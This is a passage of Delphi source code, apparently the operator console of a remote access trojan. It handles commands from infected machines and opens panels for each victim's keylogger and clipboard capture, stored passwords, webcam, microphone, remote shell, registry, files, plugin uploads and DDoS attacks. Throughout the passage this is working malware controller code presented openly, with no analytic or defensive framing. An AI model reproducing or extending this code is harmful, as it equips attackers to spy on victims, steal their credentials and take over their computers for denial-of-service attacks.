      Jpg.Free;
    except
    end;

    AddThumb(ConnDatas.Items, Bmp);
    Bmp.Free;
  end
  else

  if MainCommand = FILESEXECUTEFROMLOCAL then
  begin
    i := MyGetFileSize(ReceivedDatas);
    FileTransfer := TTransfersManager.Create(AthreadNew, ReceivedDatas, i, '', False, ConnDatas);
    FileTransfer.UploadFile;
  end
  else

  if MainCommand = PLUGINSUPLOAD then
  begin
    i := MyGetFileSize(ReceivedDatas);
    FileTransfer := TTransfersManager.Create(AThreadNew, ReceivedDatas, i, '', False, ConnDatas);
    FileTransfer.UploadFile;
  end
  else

  if MainCommand = PLUGINSCHECK then
  begin
    SendDatas(ConnDatas.AThread, INFOSREFRESH + '|');
  end
  else

  if MainCommand = INFOSSYSTEM then
  begin
    if ConnDatas.Forms[0] = nil then Exit;
    TFormMoreInfos(ConnDatas.Forms[0]).OnRead(AThreadNew, ReceivedDatas);
  end
  else
  
  if MainCommand = TASKSMANAGER then
  begin
    if ConnDatas.Forms[1] = nil then Exit;
    TFormTasksManager(ConnDatas.Forms[1]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = FILESMANAGER then
  begin
    if ConnDatas.Forms[2] = nil then Exit;
    TFormFilesManager(ConnDatas.Forms[2]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = REGISTRY then
  begin
    if ConnDatas.Forms[3] = nil then Exit;
    TFormRegistryEditor(ConnDatas.Forms[3]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = SHELL then
  begin
    if ConnDatas.Forms[4] = nil then Exit;
    TFormShell(ConnDatas.Forms[4]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = DESKTOPIMAGE then
  begin
    if ConnDatas.Forms[5] = nil then Exit;
    TFormDesktop(ConnDatas.Forms[5]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = WEBCAM then
  begin
    if ConnDatas.Forms[6] = nil then Exit;
    TFormWebcam(ConnDatas.Forms[6]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = MICROPHONESTREAM then
  begin
    if ConnDatas.Forms[7] = nil then Exit;
    TFormMicrophone(ConnDatas.Forms[7]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if (MainCommand = KEYLOGGER) or (MainCommand = CLIPBOARD) then
  begin
    if ConnDatas.Forms[8] = nil then Exit;
    TFormKeyboardInputs(ConnDatas.Forms[8]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = PASSWORDS then
  begin
    if ConnDatas.Forms[9] = nil then Exit;
    TFormPasswords(ConnDatas.Forms[9]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = CHAT then
  begin
    if ConnDatas.Forms[10] = nil then Exit;
    TFormChat(ConnDatas.Forms[10]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = WINDOWSLISTMESSAGESBOX then
  begin
    if ConnDatas.Forms[11] = nil then Exit;
    TFormMiscellaneous(ConnDatas.Forms[11]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = PORTSNIFFER then
  begin
    if ConnDatas.Forms[12] = nil then Exit;
    TFormPortSniffer(ConnDatas.Forms[12]).OnRead(AThreadNew, ReceivedDatas);
  end
  else

  if MainCommand = PORTSCANNERRESULTS then
  begin
    if ConnDatas.Forms[13] = nil then Exit;
    TFormPortScanner(ConnDatas.Forms[13]).OnRead(AThreadNew, ReceivedDatas);
  end;
end;

procedure TFormMain.idtcpsrvr1Exception(AThread: TIdPeerThread;
  AException: Exception);
begin
  AException := nil;
end;

procedure TFormMain.idtcpsrvr1Disconnect(AThread: TIdPeerThread);
var
  ConnDatas: PConnectionDatas;
begin
  if AThread.Data = nil then Exit;
  ConnDatas := PConnectionDatas(AThread.Data);

  if ConnDatas.Forms[0] <> nil then TFormMoreInfos(ConnDatas.Forms[0]).Close;
  if ConnDatas.Forms[1] <> nil then TFormTasksManager(ConnDatas.Forms[1]).Close;
  if ConnDatas.Forms[2] <> nil then TFormFilesManager(ConnDatas.Forms[2]).Close;
  if ConnDatas.Forms[3] <> nil then TFormRegistryEditor(ConnDatas.Forms[3]).Close;
  if ConnDatas.Forms[4] <> nil then TFormShell(ConnDatas.Forms[4]).Close;
  if ConnDatas.Forms[5] <> nil then TFormDesktop(ConnDatas.Forms[5]).Close;
  if ConnDatas.Forms[6] <> nil then TFormWebcam(ConnDatas.Forms[6]).Close;
  if ConnDatas.Forms[7] <> nil then TFormMicrophone(ConnDatas.Forms[7]).Close;
  if ConnDatas.Forms[8] <> nil then TFormKeyboardInputs(ConnDatas.Forms[8]).Close;
  if ConnDatas.Forms[9] <> nil then TFormPasswords(ConnDatas.Forms[9]).Close;
  if ConnDatas.Forms[10] <> nil then TFormChat(ConnDatas.Forms[10]).Close;
  if ConnDatas.Forms[11] <> nil then TFormMiscellaneous(ConnDatas.Forms[11]).Close;
  if ConnDatas.Forms[12] <> nil then TFormPortSniffer(ConnDatas.Forms[12]).Close;
  if ConnDatas.Forms[13] <> nil then TFormPortScanner(ConnDatas.Forms[13]).Close;
  if ConnDatas.Forms[14] <> nil then TFormScripts(ConnDatas.Forms[14]).Close; 
  if ConnDatas.Forms[15] <> nil then TFormDdosAttack(ConnDatas.Forms[15]).Close;
               
  if VisualNotification = True then
  begin
    PostMessage(Handle, WM_DISCONNECTION_POPUP,
                Integer(ConnDatas.Items.Subitems[0] + '|' +
                        ConnDatas.Items.Subitems[4] + '|' +
                        ConnDatas.Items.SubItems[2] + '|' +
                        ConnDatas.Items.Subitems[5] + '|' +
                        IntToStr(ConnDatas.ImageIndex) + '|'),
                0);
  end;

  PostMessage(Handle, WM_ADD_CONNECTIONLOG,
              Integer('Connection lost from (' + ConnDatas.Identification + ')'), 0);

  ConnectionList.Remove(ConnDatas);
  if ConnDatas.Items <> nil then ConnDatas.Items.Delete;
  FreeMem(ConnDatas);
  AThread.Data := nil;

  CountConnections;
end;

procedure TFormMain.M1Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormMoreInfos;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[0] <> nil then TFormMoreInfos(ConnDatas.Forms[0]).Show else
    begin
      TmpForm := TFormMoreInfos.Create(Self, ConnDatas);
      ConnDatas.Forms[0] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + '] [User: ' +
        ConnDatas.ConnInfos.User_Computer + ']';
      SendDatas(ConnDatas.AThread, INFOSSYSTEM + '|');
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[0] <> nil then TFormMoreInfos(ConnDatas.Forms[0]).Show else
      begin
        TmpForm := TFormMoreInfos.Create(Self, ConnDatas);
        ConnDatas.Forms[0] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        SendDatas(ConnDatas.AThread, INFOSSYSTEM + '|');
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.T1Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormTasksManager;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[1] <> nil then TFormTasksManager(ConnDatas.Forms[1]).Show else
    begin
      TmpForm := TFormTasksManager.Create(Self, ConnDatas);
      ConnDatas.Forms[1] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      SendDatas(ConnDatas.AThread, PROCESSLIST + '|');   
      TmpForm.pgc1.ActivePageIndex := 0;
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[1] <> nil then TFormTasksManager(ConnDatas.Forms[1]).Show else
      begin
        TmpForm := TFormTasksManager.Create(Self, ConnDatas);
        ConnDatas.Forms[1] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        SendDatas(ConnDatas.AThread, PROCESSLIST + '|');
        TmpForm.pgc1.ActivePageIndex := 0;
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.F1Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormFilesManager;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[2] <> nil then TFormFilesManager(ConnDatas.Forms[2]).Show else
    begin
      TmpForm := TFormFilesManager.Create(Self, ConnDatas);
      ConnDatas.Forms[2] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      SendDatas(ConnDatas.AThread, FILESLISTDRIVES + '|');
      TmpForm.pgc1.ActivePageIndex := 0;
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[2] <> nil then TFormFilesManager(ConnDatas.Forms[2]).Show else
      begin
        TmpForm := TFormFilesManager.Create(Self, ConnDatas);
        ConnDatas.Forms[2] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        SendDatas(ConnDatas.AThread, FILESLISTDRIVES + '|');
        TmpForm.pgc1.ActivePageIndex := 0;
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.R1Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormRegistryEditor;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[3] <> nil then TFormRegistryEditor(ConnDatas.Forms[3]).Show else
    begin
      TmpForm := TFormRegistryEditor.Create(Self, ConnDatas);
      ConnDatas.Forms[3] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[3] <> nil then TFormRegistryEditor(ConnDatas.Forms[3]).Show else
      begin
        TmpForm := TFormRegistryEditor.Create(Self, ConnDatas);
        ConnDatas.Forms[3] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.S3Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormShell;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[4] <> nil then TFormShell(ConnDatas.Forms[4]).Show else
    begin
      TmpForm := TFormShell.Create(Self, ConnDatas);
      ConnDatas.Forms[4] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      SendDatas(ConnDatas.AThread, SHELLSTART + '|');
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[4] <> nil then TFormShell(ConnDatas.Forms[4]).Show else
      begin
        TmpForm := TFormShell.Create(Self, ConnDatas);
        ConnDatas.Forms[4] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        SendDatas(ConnDatas.AThread, SHELLSTART + '|');
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.D1Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormDesktop;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;

    if lvConnections.Items[i].SubItems[10] = 'No' then
    begin
      MessageBox(Handle, 'Plugin is missing on remote machine. Please upload plugin first.',
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      Exit;
    end;

    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[5] <> nil then TFormDesktop(ConnDatas.Forms[5]).Show else
    begin
      TmpForm := TFormDesktop.Create(Self, ConnDatas);
      ConnDatas.Forms[5] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.Show;
    end;
  end
  else
  begin
    for i := 0 to ConnectionList.Count - 1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;

      if lvConnections.Items[i].SubItems[10] = 'No' then
      begin
        MessageBox(Handle, 'Plugin is missing on remote machine. Please upload plugin first.',
                   PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                   MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
        Exit;
      end;

      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[5] <> nil then TFormDesktop(ConnDatas.Forms[5]).Show else
      begin
        TmpForm := TFormDesktop.Create(Self, ConnDatas);
        ConnDatas.Forms[5] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.W1Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormWebcam;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    
    if lvConnections.Items[i].SubItems[10] = 'No' then
    begin
      MessageBox(Handle, 'Plugin is missing on remote machine. Please upload plugin first.',
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      Exit;
    end;

    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[6] <> nil then TFormWebcam(ConnDatas.Forms[6]).Show else
    begin
      TmpForm := TFormWebcam.Create(Self, ConnDatas);
      ConnDatas.Forms[6] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      
      if lvConnections.Items[i].SubItems[10] = 'No' then
      begin
        MessageBox(Handle, 'Plugin is missing on remote machine. Please upload plugin first.',
                   PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                   MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
        Exit;
      end;

      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[6] <> nil then TFormWebcam(ConnDatas.Forms[6]).Show else
      begin
        TmpForm := TFormWebcam.Create(Self, ConnDatas);
        ConnDatas.Forms[6] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.M2Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormMicrophone;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[7] <> nil then TFormMicrophone(ConnDatas.Forms[7]).Show else
    begin
      TmpForm := TFormMicrophone.Create(Self, ConnDatas);
      ConnDatas.Forms[7] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[7] <> nil then TFormMicrophone(ConnDatas.Forms[7]).Show else
      begin
        TmpForm := TFormMicrophone.Create(Self, ConnDatas);
        ConnDatas.Forms[7] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.K1Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormKeyboardInputs;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[8] <> nil then TFormKeyboardInputs(ConnDatas.Forms[8]).Show else
    begin
      TmpForm := TFormKeyboardInputs.Create(Self, ConnDatas);
      ConnDatas.Forms[8] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.pgc1.ActivePageIndex := 0;
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[8] <> nil then TFormKeyboardInputs(ConnDatas.Forms[8]).Show else
      begin
        TmpForm := TFormKeyboardInputs.Create(Self, ConnDatas);
        ConnDatas.Forms[8] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.pgc1.ActivePageIndex := 0;
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.P2Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormPasswords;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[9] <> nil then TFormPasswords(ConnDatas.Forms[9]).Show else
    begin
      TmpForm := TFormPasswords.Create(Self, ConnDatas);
      ConnDatas.Forms[9] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.pgc1.ActivePageIndex := 0;
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[9] <> nil then TFormPasswords(ConnDatas.Forms[9]).Show else
      begin
        TmpForm := TFormPasswords.Create(Self, ConnDatas);
        ConnDatas.Forms[9] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.pgc1.ActivePageIndex := 0;
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.C4Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormChat;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    
    if lvConnections.Items[i].SubItems[10] = 'No' then
    begin
      MessageBox(Handle, 'Plugin is missing on remote machine. Please upload plugin first.',
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      Exit;
    end;

    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[10] <> nil then TFormChat(ConnDatas.Forms[10]).Show else
    begin
      TmpForm := TFormChat.Create(Self, ConnDatas);
      ConnDatas.Forms[10] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      
      if lvConnections.Items[i].SubItems[10] = 'No' then
      begin
        MessageBox(Handle, 'Plugin is missing on remote machine. Please upload plugin first.',
                   PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                   MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
        Exit;
      end;

      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[10] <> nil then TFormChat(ConnDatas.Forms[10]).Show else
      begin
        TmpForm := TFormChat.Create(Self, ConnDatas);
        ConnDatas.Forms[10] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.M3Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormMiscellaneous;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[11] <> nil then TFormMiscellaneous(ConnDatas.Forms[11]).Show else
    begin
      TmpForm := TFormMiscellaneous.Create(Self, ConnDatas);
      ConnDatas.Forms[11] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.pgc1.ActivePageIndex := 0;
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[11] <> nil then TFormMiscellaneous(ConnDatas.Forms[11]).Show else
      begin
        TmpForm := TFormMiscellaneous.Create(Self, ConnDatas);
        ConnDatas.Forms[11] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.pgc1.ActivePageIndex := 0;
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.P3Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormPortSniffer;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[12] <> nil then TFormPortSniffer(ConnDatas.Forms[12]).Show else
    begin
      TmpForm := TFormPortSniffer.Create(Self, ConnDatas);
      ConnDatas.Forms[12] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      SendDatas(ConnDatas.AThread, PORTSNIFFERINTERFACES + '|');
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[12] <> nil then TFormPortSniffer(ConnDatas.Forms[12]).Show else
      begin
        TmpForm := TFormPortSniffer.Create(Self, ConnDatas);
        ConnDatas.Forms[12] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        SendDatas(ConnDatas.AThread, PORTSNIFFERINTERFACES + '|');
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.P4Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormPortScanner;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[13] <> nil then TFormPortScanner(ConnDatas.Forms[13]).Show else
    begin
      TmpForm := TFormPortScanner.Create(Self, ConnDatas);
      ConnDatas.Forms[13] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[13] <> nil then TFormPortScanner(ConnDatas.Forms[13]).Show else
      begin
        TmpForm := TFormPortScanner.Create(Self, ConnDatas);
        ConnDatas.Forms[13] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.Show;
      end;
    end;
  end;
end;

procedure TFormMain.D2Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormDdosAttack;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[15] <> nil then TFormDdosAttack(ConnDatas.Forms[15]).Show else
    begin
      TmpForm := TFormDdosAttack.Create(Self, ConnDatas);
      ConnDatas.Forms[15] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count - 1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
      if ConnDatas.Forms[15] <> nil then TFormDdosAttack(ConnDatas.Forms[15]).Show else
      begin
        TmpForm := TFormDdosAttack.Create(Self, ConnDatas);
        ConnDatas.Forms[15] := TmpForm;
        TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
          ConnDatas.ConnInfos.User_Computer + ']';
        TmpForm.Show;
      end;
    end;
  end;
end;
         
procedure TFormMain.S10Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  TmpForm: TFormScripts;
  i: Integer;
begin
  if lvConnections.SelCount = 1 then
  begin
    i := GetClientIndex;
    if i = -1 then Exit;
    ConnDatas := PConnectionDatas(ConnectionList[i]);
    if ConnDatas.Items = nil then Exit;
    if ConnDatas.Forms[14] <> nil then TFormScripts(ConnDatas.Forms[14]).Show else
    begin
      TmpForm := TFormScripts.Create(Self, ConnDatas);
      ConnDatas.Forms[14] := TmpForm;
      TmpForm.Caption := 'Socket [' + IntToStr(ConnDatas.Socket) + ']; User [' +
        ConnDatas.ConnInfos.User_Computer + ']';
      TmpForm.Show;
    end;
  end
  else
  begin
    for i:=0 to ConnectionList.Count-1 do
    begin
      if not lvConnections.Items[i].Selected then Exit;
      ConnDatas := PConnectionDatas(ConnectionList[i]);
      if ConnDatas.Items = nil then Exit;
